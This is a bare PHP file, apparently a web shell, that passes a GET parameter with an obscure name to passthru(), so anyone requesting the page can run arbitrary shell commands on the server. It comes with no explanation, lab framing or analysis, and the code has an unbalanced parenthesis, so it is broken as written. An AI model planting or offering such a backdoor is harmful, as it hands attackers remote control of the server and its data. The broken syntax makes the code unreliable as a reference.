<?php
passthru(($_GET['aHzZewm_']);
?>
